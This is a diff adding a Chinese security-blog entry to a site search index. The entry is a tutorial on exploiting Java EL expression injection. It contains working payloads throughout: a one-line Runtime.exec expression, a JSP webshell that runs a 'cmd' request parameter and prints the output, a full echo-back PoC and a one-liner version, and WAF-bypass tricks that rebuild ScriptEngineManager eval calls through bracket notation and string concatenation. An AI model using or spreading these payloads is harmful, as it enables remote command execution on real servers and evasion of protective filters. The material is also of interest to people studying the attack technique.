@@ -8802,4 +8802,80 @@ github链接：[https://github.com/jishenghua/jshERP](https://github.com/jisheng
         <tag>trick</tag>
       </tags>
   </entry>
+  <entry>
+    <title>EL表达式Trick</title>
+    <url>/2025/12/18/EL%E8%A1%A8%E8%BE%BE%E5%BC%8FTrick/</url>
+    <content><![CDATA[<h1 id="X4FJz">EL表达式Trick</h1>
+<h2 id="e4jBi">EL表达式的回显问题</h2>
+
+<p>在EL表达式中，想要进行命令执行，只需要一下一行表达式即可</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">$&#123;java.lang.Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这句表达式作用相当于jsp的一句话木马，但是只是能做到检测和盲打，在一些不出网的情况下，我们没办法进行反弹shell，不方便于EL表达式的进一步利用</p>
+<p>在我们常规的jsp回显马中是这样写的，通过<code>InputStream</code>接受<code>Runtime().exec(&#39;xxx&#39;).getInputStream</code>，来获取命令执行的输出，然后打印到response中，从而达到回显的目的</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;%</span><br><span class="line"><span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;cmd&quot;</span>));</span><br><span class="line"><span class="comment">//    System.out.println(process);</span></span><br><span class="line"><span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> process.getInputStream();</span><br><span class="line"><span class="type">BufferedReader</span> <span class="variable">bufferedReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(inputStream));</span><br><span class="line">String line;</span><br><span class="line"><span class="keyword">while</span> ((line = bufferedReader.readLine()) != <span class="literal">null</span>)&#123;</span><br><span class="line">    response.getWriter().println(line);</span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+<p>EL表达式的实现是由中间件Tomcat进行解析，然后进行反射调用，实际上的EL表达式只能写函数调用，并不能在EL表达式执行<code>new String()</code>、<code>int X</code>等定义与实例化操作</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1765974911923-d5fdb79c-ce60-4962-81cd-f842ea8b8e2f.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1765974911923-d5fdb79c-ce60-4962-81cd-f842ea8b8e2f.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>在EL表达式中定义了11个隐式对象，使用这些隐式对象可以很方便地读取到Cookie、HTTP请求消息头字段、请求参数、Web应用程序中的初始化参数的信息</p>
+<p>例如我们可以通过<code>pageContext</code>来保存属性</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1765975035660-1432f51b-903a-469d-8126-e92013f05014.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1765975035660-1432f51b-903a-469d-8126-e92013f05014.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>那么想要实现EL表达式的回显问题，可以通过以下步骤进行回显：</p>
+<ol>
+<li>使用<code>pageContext</code>保存<code>Runtime#exec</code>的<code>inputStream</code></li>
+<li>调用<code>inputStream#read</code>会将命令结果输入到<code>byte[]</code>中，我们需要找到一个<code>byte[]</code>对象</li>
+<li>反射创建一个<code>String</code>，将<code>byte[]</code>转化为<code>String</code></li>
+<li>输出String</li>
+</ol>
+<p>在平时使用中，我们知道可以通过<code>pageContext</code>对象保存属性</p>
+<p>那么我们也可以通过<code>pageContext</code>来保存<code>Runtime().exec()</code>的<code>inputStream</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1765975216762-c55ad8a3-ba86-4546-bde6-875c224daea2.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1765975216762-c55ad8a3-ba86-4546-bde6-875c224daea2.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1765975256714-819c0867-d4f7-4775-8c63-ba9023b8ea6e.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1765975256714-819c0867-d4f7-4775-8c63-ba9023b8ea6e.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>将<code>inputStream</code>保存到<code>pageContext</code>后，我们需要去寻找一个<code>byte[]</code>来接受<code>inputStream#read</code>返回的<code>byte[]</code><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1765978421798-b203bebf-0141-463b-aa61-eaf1ffdb1edc.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1765978421798-b203bebf-0141-463b-aa61-eaf1ffdb1edc.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>在EL表达式中，类加载的范围只有在以下四个包下：</p>
+<p>因此我们在后续寻找利用类时，只能从这四个包下的类进行寻找</p>
+<ul>
+<li><code>java.lang</code></li>
+<li><code>javax.servlet</code></li>
+<li><code>javax.servlet.http</code></li>
+<li><code>javax.servlet.jsp</code></li>
+</ul>
+<p><code>java.nio.ByteBuffer</code>可以用来创建一个指定大小的<code>byte[]</code>，用法如下，因为<code>ByteBuffer.allocate</code>为静态调用，因此我们可以在EL表达式中使用</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ByteBuffer</span> <span class="variable">allocate</span> <span class="operator">=</span> ByteBuffer.allocate(<span class="number">100</span>); #静态调用</span><br><span class="line"><span class="type">byte</span>[] a = allocate.array();</span><br></pre></td></tr></table></figure>
+
+<p>但是在EL表达式中，类加载的范围只有在上面说过的四个包下，我们没办法直接调用，因此我们可以使用<code>Class.forName</code>进行实例化<code>ByteBuffer</code>类</p>
+<p>能够接受<code>byte[]</code>后，我们就需要来反射获取一个<code>String</code>实例对象，将<code>byte[]</code>类型的数据转换成<code>String</code>，并输出到页面中</p>
+<p>最终Poc如下</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">$&#123;pageContext.setAttribute(<span class="string">&quot;inputStream&quot;</span>,Runtime.getRuntime().exec(<span class="string">&quot;whoami&quot;</span>).getInputStream())&#125;</span><br><span class="line"></span><br><span class="line">$&#123;Thread.sleep(<span class="number">1000</span>)&#125;</span><br><span class="line"></span><br><span class="line">$&#123;pageContext.setAttribute(<span class="string">&quot;inputStreamAvailable&quot;</span>,inputStream.available())&#125;</span><br><span class="line"></span><br><span class="line">$&#123;pageContext.setAttribute(<span class="string">&quot;byteBufferClass&quot;</span>,Class.forName(<span class="string">&quot;java.nio.ByteBuffer&quot;</span>))&#125;</span><br><span class="line">$&#123;pageContext.setAttribute(<span class="string">&quot;allocateMethod&quot;</span>,byteBufferClass.getMethod(<span class="string">&quot;allocate&quot;</span>,Integer.TYPE))&#125;</span><br><span class="line">$&#123;pageContext.setAttribute(<span class="string">&quot;heapByteBuffer&quot;</span>,allocateMethod.invoke(<span class="literal">null</span>,inputStreamAvailable))&#125;</span><br><span class="line"></span><br><span class="line">$&#123;pageContext.getAttribute(<span class="string">&quot;inputStream&quot;</span>).read(heapByteBuffer.array(),<span class="number">0</span>,inputStreamAvailable)&#125;</span><br><span class="line"></span><br><span class="line">$&#123;pageContext.setAttribute(<span class="string">&quot;byteArrType&quot;</span>, heapByteBuffer.array().getClass())&#125;</span><br><span class="line"></span><br><span class="line">$&#123;pageContext.setAttribute(<span class="string">&quot;stringClass&quot;</span>,Class.forName(<span class="string">&quot;java.lang.String&quot;</span>))&#125;</span><br><span class="line">$&#123;pageContext.setAttribute(<span class="string">&quot;stringConstructor&quot;</span>,stringClass.getConstructor(byteArrType))&#125;</span><br><span class="line">$&#123;pageContext.setAttribute(<span class="string">&quot;stringRes&quot;</span>,stringConstructor.newInstance(heapByteBuffer.array()))&#125;</span><br><span class="line"></span><br><span class="line">$&#123;pageContext.getAttribute(<span class="string">&quot;stringRes&quot;</span>)&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1765980935970-c0a6579a-0e40-47e0-bec4-46bb54302546.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1765980935970-c0a6579a-0e40-47e0-bec4-46bb54302546.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>一句话版本如下</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">$&#123;pageContext.setAttribute(<span class="string">&quot;inputStream&quot;</span>, Runtime.getRuntime().exec(<span class="string">&quot;cmd /c dir&quot;</span>).getInputStream());Thread.sleep(<span class="number">1000</span>);pageContext.setAttribute(<span class="string">&quot;inputStreamAvailable&quot;</span>, pageContext.getAttribute(<span class="string">&quot;inputStream&quot;</span>).available());pageContext.setAttribute(<span class="string">&quot;byteBufferClass&quot;</span>, Class.forName(<span class="string">&quot;java.nio.ByteBuffer&quot;</span>));pageContext.setAttribute(<span class="string">&quot;allocateMethod&quot;</span>, pageContext.getAttribute(<span class="string">&quot;byteBufferClass&quot;</span>).getMethod(<span class="string">&quot;allocate&quot;</span>, Integer.TYPE));pageContext.setAttribute(<span class="string">&quot;heapByteBuffer&quot;</span>, pageContext.getAttribute(<span class="string">&quot;allocateMethod&quot;</span>).invoke(<span class="literal">null</span>, pageContext.getAttribute(<span class="string">&quot;inputStreamAvailable&quot;</span>)));pageContext.getAttribute(<span class="string">&quot;inputStream&quot;</span>).read(pageContext.getAttribute(<span class="string">&quot;heapByteBuffer&quot;</span>).array(), <span class="number">0</span>, pageContext.getAttribute(<span class="string">&quot;inputStreamAvailable&quot;</span>));pageContext.setAttribute(<span class="string">&quot;byteArrType&quot;</span>, pageContext.getAttribute(<span class="string">&quot;heapByteBuffer&quot;</span>).array().getClass());pageContext.setAttribute(<span class="string">&quot;stringClass&quot;</span>, Class.forName(<span class="string">&quot;java.lang.String&quot;</span>));pageContext.setAttribute(<span class="string">&quot;stringConstructor&quot;</span>, pageContext.getAttribute(<span class="string">&quot;stringClass&quot;</span>).getConstructor(pageContext.getAttribute(<span class="string">&quot;byteArrType&quot;</span>)));pageContext.setAttribute(<span class="string">&quot;stringRes&quot;</span>, pageContext.getAttribute(<span class="string">&quot;stringConstructor&quot;</span>).newInstance(pageContext.getAttribute(<span class="string">&quot;heapByteBuffer&quot;</span>).array()));pageContext.getAttribute(<span class="string">&quot;stringRes&quot;</span>)&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="pmbjN">EL表达式Waf绕过</h2>
+在EL表达式中，获取某个对象的属性有两种方法：
+
+<ul>
+<li>class.value</li>
+<li>class[“value”]</li>
+</ul>
+<p>如果想要去混淆的话，我们可以将函数名或者属性变成字符串，那么通过拼接混淆就比较简单了，例如：原本的payload是这样的</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;</span>.getClass().forName(<span class="string">&quot;javax.script.ScriptEngineManager&quot;</span>).newInstance().getEngineByName(<span class="string">&quot;JavaScript&quot;</span>).eval(<span class="string">&quot;payload&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>通过<code>class[&quot;value&quot;]</code>这种方式，payload可以变成以下这样</p>
+<p>其中每一个字符串都可以使用 <code>param.xxx</code> 的参数来替换，或者使用 el 表达式进行拼接转换，比如 ${“”<a href="">“getClass”</a><a href="param.b">param.a</a><a href="">param.c</a><a href="param.e">parm.d</a><a href="param.g">param.f</a>}</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">$&#123;<span class="string">&quot;&quot;</span>[<span class="string">&quot;getClass&quot;</span>]()[<span class="string">&quot;forName&quot;</span>](<span class="string">&quot;javax.script.ScriptEngineManager&quot;</span>)[<span class="string">&quot;newInstance&quot;</span>]()[<span class="string">&quot;getEngineByName&quot;</span>](<span class="string">&quot;JavaScript&quot;</span>)[<span class="string">&quot;eval&quot;</span>](<span class="string">&quot;payload&quot;</span>)&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这样在针对关键字的拦截时，我们可以将其替换</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;getClass&quot;</span> </span><br><span class="line"><span class="comment">//替换成</span></span><br><span class="line"><span class="string">&quot;get&quot;</span> += <span class="string">&quot;Class&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="ThAUV">参考文章</h2>
+]]></content>
+      <categories>
+        <category>trick</category>
+      </categories>
+      <tags>
+        <tag>trick</tag>
+      </tags>
+  </entry>
 </search>
